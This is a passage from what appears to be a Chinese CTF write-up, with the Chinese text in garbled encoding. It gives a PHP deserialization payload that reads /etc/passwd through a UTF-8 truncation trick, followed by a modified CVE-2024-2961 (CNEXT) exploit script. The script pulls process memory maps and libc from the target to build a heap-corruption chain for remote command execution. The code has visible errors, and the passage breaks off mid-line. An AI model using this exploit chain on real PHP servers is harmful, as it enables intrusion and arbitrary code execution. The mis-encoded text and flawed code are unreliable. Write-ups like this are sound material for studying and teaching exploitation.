alt="image-20240706211046282"></p><p>æˆåŠŸæ§åˆ¶å‰é¢çš„éƒ¨åˆ†ï¼Œé‚£å°±å¯ä»¥ç›´æ¥æŠŠå‰é¢å¤šä½™çš„éƒ¨åˆ†å…¨éƒ¨ç”¨<code>%f0%9f</code>è¦†ç›–æ‰å³å¯ï¼Œæ¯æ¬¡å¯ä»¥è¦†ç›–æ‰ä¸¤ä¸ªå­—æ¯</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706212236113.png" alt="image-20240706212236113"></p><p>æœ¬åœ°æµ‹è¯•æˆåŠŸï¼Œæ³¨æ„æˆ‘çš„startå¼€å¤´æ˜¯å¤šäº†ä¸ªå­—ç¬¦è¿›è¡Œé…å¹³æˆ2çš„å€æ•°çš„</p><p>é‚£ä¹ˆpayloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>start<span class="token operator">=</span>aO<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"read_file"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"gxngxngxn"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>read<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯æ‰¾flagï¼Œæµ‹è¯•å‘ç°<code>php://input</code>ç”¨ä¸äº†ï¼Œç¯å¢ƒå˜é‡ä¹Ÿåˆ äº†</p><h3 id="CVE-2024-2961"><a href="#CVE-2024-2961" class="headerlink" title="CVE-2024-2961"></a>CVE-2024-2961</h3><p>å°è¯•æ‰“CVE-2024-2961ï¼Œæ­¤äº‹åœ¨æˆ‘çš„<a href="https://c1oudfl0w0.github.io/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/">CVE-2024-2961å¤ç°</a>ä¸­äº¦æœ‰è®°è½½</p><p>è‡ªå·±æ”¹expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ChunkedEncodingError<span class="token punctuation">,</span> ConnectionError<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"åŠ„"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        path_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        params1<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"?start=O:9:%22read_file%22:2:%7Bs:5:%22start%22;s:9:%22gxngxngxn%22;s:8:%22filename%22;s:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path_length<span class="token punctuation">&#125;</span></span><span class="token string">:%22</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">%22;%7D'"</span></span>        params2<span class="token operator">=</span><span class="token string">"&amp;read=%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9f"</span>        url<span class="token operator">=</span>self<span class="token punctuation">.</span>url<span class="token operator">+</span>params1<span class="token operator">+</span>params2        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># for key, value in params.items():</span>        <span class="token comment">#     print(f"&#123;key&#125;: &#123;value&#125;")</span>        <span class="token comment">#print(response.text)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"What you are reading is:(.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># print(data)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">""</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token 